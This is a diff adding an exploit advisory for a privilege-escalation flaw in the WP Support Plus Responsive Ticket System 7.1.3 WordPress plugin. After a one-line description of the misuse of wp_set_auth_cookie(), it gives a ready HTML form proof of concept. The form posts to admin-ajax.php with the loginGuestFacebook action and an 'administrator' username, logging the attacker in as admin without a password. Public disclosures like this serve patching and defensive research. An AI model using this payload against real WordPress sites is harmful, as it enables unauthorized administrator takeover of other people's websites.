@@ -1,0 +1,24 @@
+# Exploit Title: WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
+# Date: 10-01-2017
+# Software Link: https://wordpress.org/plugins/wp-support-plus-responsive-ticket-system/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: web
+ 
+1. Description
+
+You can login as anyone without knowing password because of incorrect usage of wp_set_auth_cookie().
+
+http://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html
+
+2. Proof of Concept
+
+<form method="post" action="http://wp/wp-admin/admin-ajax.php">
+	Username: <input type="text" name="username" value="administrator">
+	<input type="hidden" name="email" value="sth">
+	<input type="hidden" name="action" value="loginGuestFacebook">
+	<input type="submit" value="Login">
+</form>
+
+Then you can go to admin panel.
